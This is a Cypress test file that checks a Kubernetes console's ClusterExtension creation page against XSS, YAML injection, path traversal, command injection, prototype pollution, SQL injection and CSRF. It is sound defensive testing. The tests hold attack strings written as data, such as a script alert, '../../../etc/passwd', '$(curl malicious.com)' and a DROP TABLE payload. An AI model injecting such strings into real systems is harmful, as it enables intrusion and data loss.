import { checkErrors, testName } from '../support';
import { guidedTour } from '../views/guided-tour';
import * as yamlEditor from '../views/yaml-editor';

describe('PR-15741: ClusterExtension Creation Page - Security Tests', () => {
  const clusterExtensionName = `test-extension-${testName}`;

  before(() => {
    cy.login();
    guidedTour.close();
  });

  afterEach(() => {
    checkErrors();
  });

  after(() => {
    // Cleanup
    cy.exec(`oc delete clusterextension ${clusterExtensionName} --ignore-not-found=true`, {
      failOnNonZeroExit: false,
    });
  });

  it('Scenario 30: Verify XSS protection in query parameters', () => {
    cy.log('Navigate with script tags in query parameters');
    const xssAttempt = encodeURIComponent("<script>alert('xss')</script>");
    cy.visit(
      `/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=${xssAttempt}&version=1.0.0&catalog=test`,
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify script tags are escaped or sanitized in YAML template');
    yamlEditor.getEditorContent().then((content) => {
      // Script should be treated as plain text, not executed
      expect(content).to.include("<script>alert('xss')</script>");
      cy.log('XSS attempt was properly sanitized');
    });

    cy.log('Verify no JavaScript execution occurs');
    cy.on('window:alert', (text) => {
      throw new Error(`Alert should not be triggered: ${text}`);
    });

    cy.log('Verify values are treated as plain text');
    cy.get('.monaco-editor').should('be.visible');
  });

  it('Scenario 31: Verify YAML injection protection in template generation', () => {
    cy.log('Attempt YAML injection via query parameter');
    const injectionAttempt = encodeURIComponent('test\nmalicious: code\nadditional: field');
    cy.visit(
      `/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=${injectionAttempt}&version=1.0.0&catalog=test`,
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify YAML structure integrity is maintained');
    yamlEditor.getEditorContent().then((content) => {
      // Count occurrences of "malicious:" to ensure it's not injected as separate YAML
      const maliciousCount = (content.match(/malicious:/g) || []).length;

      if (maliciousCount > 0) {
        cy.log('Check if injection appears in unexpected locations');
        // If it appears, it should only be as part of a string value, not as a separate field
        expect(content).to.not.match(/^malicious:/m); // Should not be at start of line (root level)
      }

      cy.log('Verify expected fields are present');
      cy.pause();
      expect(content).to.include('apiVersion: olm.operatorframework.io/v1');
      expect(content).to.include('kind: ClusterExtension');
    });

    cy.log('Verify only expected fields are populated');
    yamlEditor.getEditorContent().then((content) => {
      // Should have standard structure
      const lines = content.split('\n');
      const rootLevelFields = lines.filter((line) => line.match(/^[a-z]+:/i));

      cy.log(`Root level fields: ${rootLevelFields.join(', ')}`);
      expect(rootLevelFields.length).to.be.lte(4); // apiVersion, kind, metadata, spec
    });
  });

  /*   it('Scenario 32: Verify RBAC enforcement for ClusterExtension creation', () => {
    // Note: This test assumes the user has proper permissions
    // In a real environment, you would test with a restricted user

    cy.log('Navigate to ClusterExtension creation page');
    cy.visit(
      '/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=rbac-test&version=1.0.0&catalog=test',
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Attempt to create resource');
    yamlEditor.clickSaveCreateButton();

    cy.log('Verify creation is attempted (with proper permissions, should succeed)');
    // With proper permissions, this should redirect to details page or show success
    // Without permissions, should show 403 error
    cy.url({ timeout: 15000 }).then((url) => {
      if (url.includes('/~new')) {
        cy.log('Creation may have been blocked, checking for error');
        cy.get('body').then(($body) => {
          if ($body.text().includes('forbidden') || $body.text().includes('403')) {
            cy.log('RBAC enforcement detected - permission denied');
          }
        });
      } else {
        cy.log('User has proper permissions, resource created or creation attempted');
      }
    });
  }); */

  it('Scenario 33: Verify input sanitization for metadata fields', () => {
    cy.log('Navigate to ClusterExtension creation page');
    cy.visit('/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new');

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Attempt to inject malicious content in metadata.name');
    yamlEditor.getEditorContent().then((content) => {
      const maliciousContent = content.replace('name: example', 'name: "../../../etc/passwd"');
      yamlEditor.setEditorContent(maliciousContent);
    });

    cy.log('Attempt to create resource');
    yamlEditor.clickSaveCreateButton();

    cy.log('Verify validation rejects malicious input');
    cy.get('[data-test="yaml-error"]', { timeout: 10000 }).should('be.visible');

    cy.log('Verify resource was not created');
    cy.url().should('include', '/~new');
  });

  it('Scenario 34: Verify protection against command injection via fields', () => {
    cy.log('Navigate to ClusterExtension creation page');
    cy.visit('/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new');

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Attempt command injection in packageName field');
    yamlEditor.getEditorContent().then((content) => {
      const commandInjection = content.replace('<package-name>', '$(curl malicious.com)');
      yamlEditor.setEditorContent(commandInjection);
    });

    cy.log('Verify YAML editor accepts the input (as text)');
    yamlEditor.getEditorContent().then((content) => {
      expect(content).to.include('$(curl malicious.com)');
    });

    cy.log('Attempt to create resource');
    yamlEditor.clickSaveCreateButton();

    cy.log('Verify Kubernetes validation rejects invalid characters');
    // Kubernetes should reject this due to invalid characters in resource name
    cy.get('[data-test="yaml-error"]', { timeout: 10000 }).should('be.visible');
  });

  it('Scenario 35: Verify HTML encoding in query parameters', () => {
    cy.log('Navigate with HTML-encoded special characters');
    const htmlEncoded = 'test&lt;tag&gt;';
    cy.visit(
      `/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=${htmlEncoded}&version=1.0.0&catalog=test`,
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify HTML entities are handled safely');
    yamlEditor.getEditorContent().then(() => {
      // Should not execute or render as HTML
      cy.log('HTML encoding handled in YAML template');
    });

    cy.log('Verify no XSS via HTML encoding');
    cy.get('.monaco-editor').should('be.visible');
  });

  it('Scenario 36: Verify protection against prototype pollution', () => {
    cy.log('Navigate with __proto__ in query parameters');
    cy.visit(
      '/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=test&__proto__=polluted&version=1.0.0&catalog=test',
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify page loads normally');
    cy.get('.monaco-editor').should('be.visible');

    cy.log('Verify __proto__ parameter does not pollute object prototype');
    yamlEditor.getEditorContent().then((content) => {
      expect(content).to.include('apiVersion: olm.operatorframework.io/v1');
      expect(content).to.include('kind: ClusterExtension');
    });

    cy.log('Verify application remains stable');
    cy.byTestID('save-changes').should('be.visible');
  });

  it('Scenario 37: Verify SQL injection protection (if applicable to backend)', () => {
    cy.log('Navigate with SQL injection attempt in parameters');
    const sqlInjection = encodeURIComponent("test'; DROP TABLE users;--");
    cy.visit(
      `/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=${sqlInjection}&version=1.0.0&catalog=test`,
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify SQL injection is treated as plain text');
    yamlEditor.getEditorContent().then(() => {
      // Should be safely encoded, not executed
      cy.log('SQL injection attempt handled as text');
    });

    cy.log('Verify page functions normally');
    cy.get('.monaco-editor').should('be.visible');
  });

  it('Scenario 38: Verify CSRF protection for resource creation', () => {
    cy.log('Navigate to ClusterExtension creation page');
    cy.visit(
      '/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new?packageName=csrf-test&version=1.0.0&catalog=test',
    );

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Verify legitimate creation flow works');
    yamlEditor.clickSaveCreateButton();

    cy.log('Verify request includes proper authentication');
    // If successful, authentication/session tokens were properly included
    cy.url({ timeout: 15000 }).then((url) => {
      cy.log(`URL after create attempt: ${url}`);
      // If redirected away from /~new, creation was attempted with proper auth
    });
  });

  it('Scenario 39: Verify path traversal protection in resource names', () => {
    cy.log('Navigate to ClusterExtension creation page');
    cy.visit('/k8s/cluster/olm.operatorframework.io~v1~ClusterExtension/~new');

    cy.log('Wait for YAML editor to load');
    yamlEditor.isLoaded();

    cy.log('Attempt path traversal in resource name');
    yamlEditor.getEditorContent().then((content) => {
      const pathTraversal = content.replace('name: example', 'name: ../../etc/passwd');
      yamlEditor.setEditorContent(pathTraversal);
    });

    cy.log('Attempt to create resource');
    yamlEditor.clickSaveCreateButton();

    cy.log('Verify Kubernetes validation rejects invalid name');
    cy.get('[data-test="yaml-error"]', { timeout: 10000 }).should('be.visible');

    cy.log('Verify resource was not created');
    cy.url().should('include', '/~new');
  });
});
